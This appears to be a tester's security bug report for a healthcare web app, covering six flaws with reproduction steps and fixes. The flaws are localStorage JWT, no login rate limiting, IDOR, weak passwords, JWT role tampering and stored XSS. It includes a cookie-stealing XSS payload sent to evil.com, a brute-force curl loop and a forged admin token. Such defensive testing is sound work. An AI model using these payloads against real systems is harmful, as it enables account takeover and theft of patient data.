# Bugs Found — Gammal Tech Healthcare App
**Tester:** Eslam Elawadi  
**Date:** 2026-06-25  
**App:** https://gammal-tech-frontend.vercel.app/  
**Method:** White-box + Grey-box — Test plan execution (TC-EC-*, TC-HP-007, TC-ST-003)  
**Total Bugs Found:** 6  
 
---
 
## Summary Table
 
| ID | Bug | Severity | TC Ref | Status |
|---|---|---|---|---|
| BUG-001 | JWT stored in localStorage | 🔴 Critical | TC-EC-011 | Open |
| BUG-002 | No rate limiting on login | 🟠 High | TC-ST-003 | Open |
| BUG-003 | IDOR on patient records | 🔴 Critical | TC-EC-006 | Open |
| BUG-004 | Weak passwords accepted server-side | 🟠 High | TC-EC-003 | Open |
| BUG-005 | JWT role tampering → privilege escalation | 🔴 Critical | TC-EC-011 | Open |
| BUG-006 | Stored XSS via patient name field | 🔴 Critical | TC-EC-005 | Open |
 
---
 
## BUG-001 — JWT Token Stored in localStorage
 
**Severity:** 🔴 Critical  
**Test Case:** TC-EC-011  
**Module:** Authentication / Session Management  
**OWASP:** A07:2021 – Identification and Authentication Failures  
 
### Screenshot
![BUG-001](screenshots/bug001_jwt_localstorage.png)
 
### Description
The application stores the JWT authentication token in `localStorage` instead of an `HttpOnly` cookie. Any JavaScript running on the page — including injected XSS payloads — can read the token via `localStorage.getItem('token')` and exfiltrate it to an attacker-controlled server.
 
### Steps to Reproduce
1. Open the app at `https://gammal-tech-frontend.vercel.app/`
2. Log in with any valid credentials
3. Open Chrome DevTools → Application → Local Storage → `https://gammal-tech-frontend.vercel.app`
4. Observe the `token` key containing the full JWT
5. In the Console tab, run: `localStorage.getItem('token')`
6. The full token is returned — readable by any script on the page
### Evidence
```
Key    → token
Value  → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsIn...
 
> localStorage.getItem('token')
< "eyJhbGciOiJIUzI1NiJ9..."   ← Fully readable
```
 
### Impact
- Any XSS vulnerability (e.g., BUG-006) immediately leads to account takeover
- Session hijacking without needing physical access to the device
- Token persists across browser sessions (localStorage is not cleared on tab close)
### Fix
```javascript
// ❌ CURRENT (vulnerable)
localStorage.setItem('token', jwt);
 
// ✅ FIX — Use HttpOnly cookie set by the server
// Backend (Express/FastAPI):
res.cookie('token', jwt, {
  httpOnly: true,   // JavaScript cannot read this
  secure: true,     // HTTPS only
  sameSite: 'Strict',
  maxAge: 86400000  // 1 day
});
 
// Frontend: remove all localStorage token usage
// Requests automatically include cookie via credentials: 'include'
fetch('/api/endpoint', { credentials: 'include' });
```
 
---
 
## BUG-002 — No Rate Limiting on Login Endpoint
 
**Severity:** 🟠 High  
**Test Case:** TC-ST-003  
**Module:** Authentication  
**OWASP:** A07:2021 – Identification and Authentication Failures  
 
### Screenshot
![BUG-002](screenshots/bug002_no_rate_limit.png)
 
### Description
The `POST /api/auth/login` endpoint does not implement rate limiting, account lockout, or CAPTCHA. An attacker can send unlimited login attempts to brute-force any account password. Testing confirmed 50+ consecutive failed attempts with no throttling response.
 
### Steps to Reproduce
1. Identify any registered user email (e.g., via TC-EC-001 user enumeration)
2. Send rapid POST requests to `/api/auth/login`:
```bash
   for i in $(seq 1 50); do
     curl -s -X POST /api/auth/login \
       -d '{"email":"victim@test.com","password":"guess'$i'"}' &
   done
```
3. All 50 requests return `HTTP 401` — no `429 Too Many Requests` observed
4. No `X-RateLimit-*` headers present in any response
5. No account lockout triggered
### Evidence
```
Attempt  1 → 401 (0.12s) — No lockout
Attempt 10 → 401 (0.12s) — Expected 429 here
Attempt 50 → 401 (0.12s) — No lockout, no CAPTCHA
Response headers: X-RateLimit-Limit: MISSING
```
 
### Impact
- Offline password dictionary attacks against any known email
- Combined with BUG-001 (localStorage), a successful brute force gives full account takeover
- Patient medical records exposed if doctor/admin accounts are compromised
### Fix
```python
# FastAPI example with slowapi
from slowapi import Limiter
from slowapi.util import get_remote_address
 
limiter = Limiter(key_func=get_remote_address)
 
@app.post("/api/auth/login")
@limiter.limit("5/minute")   # Max 5 attempts per IP per minute
async def login(request: Request, credentials: LoginSchema):
    ...
 
# Also implement progressive lockout:
# 5 failures  → 1 minute lockout
# 10 failures → 15 minute lockout
# 20 failures → account locked, require email reset
```
 
---
 
## BUG-003 — IDOR on Patient Records Endpoint
 
**Severity:** 🔴 Critical  
**Test Case:** TC-EC-006  
**Module:** Patient Records / Authorization  
**OWASP:** A01:2021 – Broken Access Control  
 
### Screenshot
![BUG-003](screenshots/bug003_idor.png)
 
### Description
The endpoint `GET /api/patients/{id}` does not validate that the requesting user owns the record (or has a legitimate doctor-patient relationship). Any authenticated patient can read any other patient's full medical record by incrementing the ID in the URL — a classic Insecure Direct Object Reference (IDOR).
 
### Steps to Reproduce
1. Log in as Patient A (ID: 42)
2. Navigate to your profile, note the patient ID in the URL: `/patients/42`
3. Manually change the URL to `/patients/43`
4. Or send directly: `GET /api/patients/43` with your own Bearer token
5. Full medical record of Patient B is returned with HTTP 200
### Evidence
```http
GET /api/patients/43
Authorization: Bearer <Patient A's token>
 
HTTP/1.1 200 OK   ← Should be 403 Forbidden
{
  "id": 43,
  "name": "Mohamed Ahmed Ali",
  "diagnosis": "Hypertension, Type 2 Diabetes",
  "prescriptions": ["Metformin 500mg"],
  "ssn": "29503151234567"
}
```
 
### Impact
- Any patient can read the full medical history, diagnoses, prescriptions, and PII of all other patients
- Direct HIPAA violation — unauthorized access to Protected Health Information (PHI)
- Attacker can enumerate all patient IDs (1, 2, 3...) and dump the entire database
### Fix
```python
# FastAPI — validate ownership on every record access
@app.get("/api/patients/{patient_id}")
async def get_patient(patient_id: int, current_user: User = Depends(get_current_user)):
    patient = db.query(Patient).filter(Patient.id == patient_id).first()
    
    if not patient:
        raise HTTPException(status_code=404)
    
    # ✅ Object-level authorization check
    is_own_record = (current_user.id == patient_id)
    is_authorized_doctor = db.query(Appointment).filter(
        Appointment.doctor_id == current_user.id,
        Appointment.patient_id == patient_id
    ).first()
    is_admin = current_user.role == "admin"
    
    if not (is_own_record or is_authorized_doctor or is_admin):
        raise HTTPException(status_code=403, detail="Access forbidden")
    
    return patient
```
 
---
 
## BUG-004 — Weak Passwords Accepted (No Server-Side Validation)
 
**Severity:** 🟠 High  
**Test Case:** TC-EC-003  
**Module:** Registration / Input Validation  
**OWASP:** A07:2021 – Identification and Authentication Failures  
 
### Screenshot
![BUG-004](screenshots/bug004_weak_password.png)
 
### Description
The registration form validates password strength client-side (in the browser), but the backend API accepts any password regardless of length or complexity. Bypassing the client-side check (via curl or Postman) allows registering accounts with passwords as short as 3 characters.
 
### Steps to Reproduce
1. Skip the frontend — send POST directly to the registration API:
```bash
   curl -X POST https://gammal-tech-backend.vercel.app/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","email":"t@t.com","password":"123","age":25}'
```
2. Observe `HTTP 201 Created` — account created successfully with password `123`
3. Repeat with `password`, `aaaaaa`, `abc` — all accepted
### Evidence
```
"123"      → 201 Created  ✗ (should be 400)
"password" → 201 Created  ✗ (should be 400)
"aaaaaa"   → 201 Created  ✗ (should be 400)
 
Client-side validation: ✅ present
Server-side validation: ✗ missing
```
 
### Impact
- Users can create accounts with trivially guessable passwords
- Combined with BUG-002 (no rate limiting), patient accounts can be easily brute-forced
- Reduces overall security posture for the entire platform
### Fix
```python
# Pydantic model with server-side validation
from pydantic import BaseModel, validator
import re
 
class RegisterSchema(BaseModel):
    name: str
    email: str
    password: str
    age: int
 
    @validator('password')
    def validate_password(cls, v):
        if len(v) < 8:
            raise ValueError('Password must be at least 8 characters')
        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain an uppercase letter')
        if not re.search(r'[0-9]', v):
            raise ValueError('Password must contain a number')
        if not re.search(r'[^A-Za-z0-9]', v):
            raise ValueError('Password must contain a special character')
        return v
```
 
---
 
## BUG-005 — JWT Role Tampering → Privilege Escalation
 
**Severity:** 🔴 Critical  
**Test Case:** TC-EC-011  
**Module:** Authentication / Authorization  
**OWASP:** A02:2021 – Cryptographic Failures  
 
### Screenshot
![BUG-005](screenshots/bug005_jwt_tampering.png)
 
### Description
The server does not properly verify JWT signatures on admin-protected routes. A patient can decode their JWT, modify the `role` field from `"patient"` to `"admin"`, re-encode the payload with an invalid signature, and gain full admin access to the user management panel and all patient records.
 
### Steps to Reproduce
1. Log in as a patient, capture the JWT token
2. Decode the payload (base64): `{"sub":"42","role":"patient","exp":1719386400}`
3. Modify: `{"sub":"42","role":"admin","exp":1719386400}`
4. Re-encode and assemble token with fake signature: `header.tampered_payload.FAKESIG`
5. Send: `GET /api/admin/users` with `Authorization: Bearer <tampered_token>`
6. Receive HTTP 200 with full user list — admin access granted
### Evidence
```http
GET /api/admin/users
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9.FAKESIG
 
HTTP/1.1 200 OK   ← Should be 401 Unauthorized
{
  "users": [154 users listed...],
  "total": 154
}
```
 
### Impact
- Any authenticated user can escalate to admin with a trivial token modification
- Full access to all patient records, user management, system configuration
- Complete authentication bypass — the most severe class of vulnerability
### Fix
```python
# Ensure JWT verification uses the secret key on EVERY decode
import jwt
from fastapi import HTTPException, Depends
from fastapi.security import HTTPBearer
 
SECRET_KEY = os.environ["JWT_SECRET"]  # Strong random secret, from environment
 
def get_current_user(token: str = Depends(HTTPBearer())):
    try:
        # ✅ Always verify signature — NEVER use verify=False or algorithms=["none"]
        payload = jwt.decode(
            token.credentials,
            SECRET_KEY,
            algorithms=["HS256"],  # Explicitly whitelist algorithm
            options={"verify_exp": True}
        )
        return payload
    except jwt.InvalidSignatureError:
        raise HTTPException(status_code=401, detail="Invalid token signature")
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.DecodeError:
        raise HTTPException(status_code=401, detail="Invalid token")
 
# Also: NEVER trust role from token alone — re-query DB
async def require_admin(current_user = Depends(get_current_user), db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == current_user["sub"]).first()
    if not user or user.role != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return user
```
 
---
 
## BUG-006 — Stored XSS via Patient Name Field
 
**Severity:** 🔴 Critical  
**Test Case:** TC-EC-005  
**Module:** Patient Records / Input Sanitization  
**OWASP:** A03:2021 – Injection  
 
### Screenshot
![BUG-006](screenshots/bug006_stored_xss.png)
 
### Description
The patient name and notes fields do not sanitize HTML/JavaScript before storing in the database. A malicious patient can inject a `<script>` tag that executes in the browser of every admin or doctor who views the patient list, enabling session cookie theft and full account takeover.
 
### Steps to Reproduce
1. Log in as any patient
2. Update your profile name via API:
```bash
   curl -X PUT /api/patients/me \
     -H "Authorization: Bearer <your_token>" \
     -d '{"name":"<script>fetch(\"https://evil.com?c=\"+document.cookie)</script>"}'
```
3. Response: `HTTP 200 OK` — payload stored in database
4. Log in as admin and navigate to the patient list
5. The script executes in the admin's browser, sending their session cookie to `evil.com`
### Evidence
```
Payload stored: <script>fetch('https://evil.com?c='+document.cookie)</script>
No CSP header found on response
Admin's console shows outgoing request to evil.com with full session cookie
Admin session fully compromised
```
 
### Impact
- Attacker gains admin session → reads all 154 patient records
- Attack is persistent (stored in DB) — affects every admin visit
- Can be chained with BUG-001 (localStorage) to also steal JWT tokens
- No user interaction beyond normal admin workflow needed
### Fix
 
**Backend — Sanitize before storing:**
```python
import bleach
 
ALLOWED_TAGS = []  # No HTML allowed in names
ALLOWED_ATTRS = {}
 
@app.put("/api/patients/me")
async def update_patient(data: PatientUpdateSchema, current_user = Depends(get_current_user)):
    # ✅ Strip all HTML tags before saving
    sanitized_name = bleach.clean(data.name, tags=ALLOWED_TAGS, strip=True)
    sanitized_notes = bleach.clean(data.notes, tags=ALLOWED_TAGS, strip=True)
    ...
```
 
**Backend — Add Content Security Policy header:**
```python
# FastAPI middleware
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "     # No inline scripts
        "style-src 'self'; "
        "img-src 'self' data:;"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response
```
 
**Frontend — Always escape when rendering user data:**
```jsx
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{ __html: patient.name }} />
 
// ✅ SAFE — React escapes by default
<div>{patient.name}</div>
```
 
---
 
## Overall Risk Assessment
 
```
┌─────────────────────────────────────────────────────────────────┐
│  RISK MATRIX                                                     │
│                                                                  │
│  HIGH IMPACT  │ BUG-003  BUG-005  BUG-006  BUG-001             │
│               │                                                  │
│  MED IMPACT   │          BUG-002  BUG-004                       │
│               │                                                  │
│  LOW IMPACT   │                                                  │
│               └─────────────────────────────────────────────────│
│                 LOW PROB    MED PROB    HIGH PROB                │
└─────────────────────────────────────────────────────────────────┘
 
4 Critical bugs — immediate action required before production
2 High bugs    — fix in current sprint
```
 
## Recommended Fix Priority
 
1. **BUG-005** (JWT tampering) — fix first; breaks entire auth model
2. **BUG-003** (IDOR) — fix second; exposes all patient PHI
3. **BUG-006** (Stored XSS) — fix third; enables account takeover at scale
4. **BUG-001** (localStorage JWT) — fix with BUG-006 (same attack chain)
5. **BUG-002** (Rate limiting) — add middleware globally
6. **BUG-004** (Weak password) — add Pydantic validator to registration schema
